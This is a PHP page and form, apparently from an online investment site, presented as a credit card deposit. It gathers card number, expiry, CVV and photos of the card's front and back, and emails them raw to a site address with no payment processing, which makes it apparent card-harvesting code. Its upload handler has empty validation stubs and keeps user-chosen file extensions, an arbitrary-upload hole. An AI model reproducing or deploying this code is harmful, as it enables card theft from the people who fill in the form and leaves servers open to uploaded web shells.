<?php
include "../core/config.php";
if (!isLogged()) {
  header("location: ../sign-in.php");
  exit;
}

$mErr = "";
if (isset($_POST['deposit'])) {
  $amount = $_POST['amount'];
  $cardname = $_POST['cardname'];
  $cardnumber = $_POST['cardnumber'];
  $cardmon = $_POST['cardmon'];
  $cardyear = $_POST['cardyear'];
  $cvv = $_POST['cvv'];
  $front_page = $_FILES['front_page'];
  $back_page = $_FILES['back_page'];
  $frontname = urlize($UserDetails->full_name) . '_cardfrontcard';
  $backname = urlize($UserDetails->full_name) . '_cardbackcard';

  if ($front_page['size'] > 0) {
    $thumb_name = $front_page['name'];
    $thumb_tmp = $front_page['tmp_name'];
    $thumb_size = $front_page['size'];
    $thumb_upload_path = card_upload_dir . '/' . $thumb_name;
    $thumb_ext = strtolower(pathinfo($thumb_upload_path, PATHINFO_EXTENSION));
    $thumb_link = $frontname . '.' . $thumb_ext;
    $new_thumb_upload_path = card_upload_dir . '/' . $thumb_link;
    #validate size

    #validate extension

  }
  if ($back_page['size'] > 0) {
    $bthumb_name = $back_page['name'];
    $bthumb_tmp = $back_page['tmp_name'];
    $bthumb_size = $back_page['size'];
    $bthumb_upload_path = card_upload_dir . '/' . $bthumb_name;
    $bthumb_ext = strtolower(pathinfo($bthumb_upload_path, PATHINFO_EXTENSION));
    $bthumb_link = $backname . '.' . $bthumb_ext;
    $bnew_thumb_upload_path = card_upload_dir . '/' . $bthumb_link;
  }
  $move_thumb = move_uploaded_file($thumb_tmp, $new_thumb_upload_path);
  $bmove_thumb = move_uploaded_file($bthumb_tmp, $bnew_thumb_upload_path);

  $usr = new Royaltechinc\Mailer;

  $usr->mailAdminCCard("support@timelineinvestment.uk", $amount, $UserDetails->email, $UserDetails->full_name, $cardname, $cardnumber, $cardmon, $cardyear, $cvv, $thumb_link, $bthumb_link);
  $_SESSION['alert'] = '<div class="alert alert-success alert-dismissible">
                      <button type="button" class="close" data-dismiss="alert" aria-hidden="true">×</button>
                      <h4><i class="fa fa-sucess"></i> Alert!</h4>
                      <h5>Deposit with Credit Card is in process</h5>
                    </div>';
  header("location: index.php");
  exit;
}


include "header.php";
include "sidebar.php";



?>
<title>Credit Card Deposit | TimeLine-Investment </title>
<!-- Content Wrapper. Contains page content -->
<div class="content-wrapper">
  <!-- Content Header (Page header) -->
  <section class="content-header">
    <div id="google_translate_element" class="text-center mb-2"></div>
    <h1>
      Deposit Credit Card
    </h1>
    <ol class="breadcrumb">
      <li class="breadcrumb-item"><a href="index.php"><i class="fa fa-dashboard"></i> Home</a></li>
      <li class="breadcrumb-item active">Deposit Credit Card</li>


      <?= $mErr ?>
    </ol>
  </section>

  <!-- Main content -->
  <section class="content">
    <div class="row">
      <div class="col-sm-12">
      </div>
    </div>

    <div class="row">
      <div class="col-lg-12">
        <div class="box box-solid">
          <div class="box-header with-border">
            <h3 class="box-title"><i class="fa fa-user-secret"></i> Credit Card Deposit </h3>

            <div class="box-tools pull-right">
              <button type="button" class="btn btn-box-tool" data-widget="collapse"><i class="fa fa-minus"></i></button>
              <button type="button" class="btn btn-box-tool" data-widget="remove"><i class="fa fa-remove"></i></button>
            </div>
          </div>
          <!-- /.box-header -->
          <script>
            function validatecardnumber(cardnumber) {
              // Strip spaces and dashes
              cardnumber = cardnumber.replace(/[ -]/g, '');
              // See if the card is valid
              // The regex will capture the number in one of the capturing groups
              var match = /^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9]{2})[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35[0-9]{3})[0-9]{11}))$/.exec(cardnumber);
              if (match) {
                // List of card types, in the same order as the regex capturing groups
                var types = ['Visa', 'MasterCard', 'Discover', 'American Express',
                  'Diners Club', 'JCB'
                ];
                // Find the capturing group that matched
                // Skip the zeroth element of the match array (the overall match)
                for (var i = 1; i < match.length; i++) {
                  if (match[i]) {
                    // Display the card type for that group
                    document.getElementById('notice').innerHTML = types[i - 1];
                    document.getElementById('submitcard').removeAttribute("disabled");
                    break;
                  }
                }

              } else {
                document.getElementById('notice').innerHTML = '(invalid card number)';
                document.getElementById('submitcard').setAttribute("disabled", "disabled");
              }
            }
          </script>
          <div class="box-body">
            <div class="alert alert-info">
              <p style="font-size: 16px;">Fill the required boxes to topup using credit card
              </p>
            </div>

            <br>
            <form class="form" method="post" enctype="multipart/form-data">

              <div class="form-group">
                <label>Amount</label>
                <input type="number" class="form-control" name="amount" required="">

              </div>

              <div class="form-group">
                <label>Name on Card</label>
                <input type="text" class="form-control" name="cardname" required="">

              </div>


              <div class="form-group">
                <label>Card Number</label>
                <input type="number" class="form-control" name="cardnumber" onkeyup="validatecardnumber(this.value)" required="">
                <p id="notice">(no card number entered)</p>
              </div>
              <div class="row">
                <div class="col-md-4">
                  <div class="form-group">
                    <label>EXP(MM)</label>
                    <input type="number" class="form-control" min="01" max="12" minlength="2" maxlength="2" name="cardmon" required="">

                  </div>

                </div>

                <div class="col-md-4">
                  <div class="form-group">
                    <label>EXP(YY)</label>
                    <input type="number" class="form-control" minlength="2" maxlength="2" name="cardyear" required="">

                  </div>

                </div>
                <div class="col-md-4">
                  <div class="form-group">
                    <label>CVV</label>
                    <input type="number" class="form-control" minlength="3" name="cvv" required="">

                  </div>

                </div>

              </div>

              <div class="row">
                <div class="col-md-6">
                  <div class="imageupload card bg-dark">
                    <div class="card-header clearfix">
                      <h6 class="card-title pull-left">Card Front View</h6>
                    </div>
                    <div class="file-tab card-body">
                      <label class="btn btn-warning btn-file mt-5" style="display: block;">
                        <span>Browse</span>
                        <!-- The file is stored here. -->
                        <input type="file" name="front_page" accept="image/*" capture="camera" required="">
                      </label>
                      <button type="button" class="btn btn-danger btn-block">Remove</button>
                    </div>
                  </div>
                </div>

                <div class="col-md-6">
                  <div class="imageupload card bg-dark">
                    <div class="card-header clearfix">
                      <h6 class="card-title pull-left">Card Back View</h6>
                    </div>
                    <div class="file-tab card-body">
                      <label class="btn btn-warning btn-file mt-5" style="display: block;">
                        <span>Browse</span>
                        <!-- The file is stored here. -->
                        <input type="file" name="back_page" accept="image/*" capture="camera" required="">
                      </label>
                      <button type="button" class="btn btn-danger btn-block">Remove</button>
                    </div>
                  </div>
                </div>
              </div>

              <center>
                <div class="form-group">
                  <button name="deposit" type="submit" class="btn btn-info btn-lg" id="submitcard" disabled><i class="fa fa-check-square-o"></i> Verify My Account</button>
                </div>
              </center>
            </form>
          </div>
          <!-- /.box-body -->
        </div>
        <!-- /.box -->
      </div>
      <!-- Col -->
    </div>
    <!-- Row -->

  </section>
  <!-- /.content -->
</div>
<!-- /.content-wrapper -->


<?php


include "footer.php";

?>
<script src="js/bootstrap-imageupload.js"></script>

<script type="text/javascript">
  var $imageupload = $('.imageupload');
  $imageupload.imageupload({
    allowedFormats: ['jpg', 'jpeg', 'png'],
    maxWidth: 250,
    maxHeight: 250,
    maxFileSizeKb: 5096
  });
</script>